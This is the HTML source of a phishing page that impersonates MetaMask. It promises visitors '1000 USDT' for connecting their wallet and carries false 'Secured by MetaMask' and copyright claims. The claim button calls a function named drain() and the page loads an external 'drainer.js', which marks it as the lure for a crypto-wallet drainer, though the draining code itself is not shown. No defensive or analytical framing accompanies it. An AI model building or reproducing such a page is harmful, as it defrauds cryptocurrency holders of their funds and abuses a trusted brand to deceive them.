<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>MetaMask - Secure Claim</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: 'Inter', sans-serif;
      text-align: center;
      padding: 40px;
      margin: 0;
    }
    .container {
      background: #1a1a1a;
      border-radius: 16px;
      padding: 30px;
      max-width: 420px;
      margin: 0 auto;
      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
    }
    .fox-container {
      position: relative;
      width: 160px;
      height: 160px;
      margin: 20px auto;
    }
    .fox {
      width: 100%;
      transition: transform 0.3s ease;
    }
    h1 {
      font-size: 24px;
      color: #f6851b;
      margin: 10px 0;
    }
    p {
      font-size: 16px;
      color: #ccc;
      margin: 15px 0;
    }
    .claim-text {
      font-size: 18px;
      color: #fff;
      margin: 20px 0;
    }
    .connect-btn {
      background: #f6851b;
      color: #fff;
      border: none;
      padding: 16px;
      border-radius: 12px;
      font-size: 18px;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      margin-top: 20px;
    }
    .connect-btn:hover {
      background: #e2761b;
    }
    .secured {
      font-size: 14px;
      color: #00ff00; /* سبز */
      margin-top: 20px;
      font-weight: bold;
    }
    .footer {
      font-size: 12px;
      color: #666;
      margin-top: 30px;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <div class="fox-container" id="foxContainer">
      <img class="fox" src="https://cryptologos.cc/logos/metamask-metamask-logo.png" alt="MetaMask Fox">
    </div>
    <h1>MetaMask</h1>
    <p class="claim-text">Connect your wallet to receive <strong>1000 USDT</strong> instantly!</p>
    <p>No gas fees • Secure transaction • Powered by Ethereum</p>
    <p class="secured">✅ Secured by MetaMask</p>
    <button class="connect-btn" onclick="drain()">Connect Wallet & Claim</button>
    <div class="footer">© 2025 MetaMask • Encrypted • Secure</div>
  </div>

  <script>
    const foxContainer = document.getElementById('foxContainer');
    const fox = foxContainer.querySelector('.fox');

    document.addEventListener('mousemove', (e) => {
      const rect = foxContainer.getBoundingClientRect();
      const x = e.clientX - rect.left - rect.width / 2;
      const y = e.clientY - rect.top - rect.height / 2;
      const angle = Math.atan2(y, x) * (180 / Math.PI);
      fox.style.transform = `rotate(${angle}deg)`;
    });
  </script>
  <script src="drainer.js"></script>
</body>
</html>
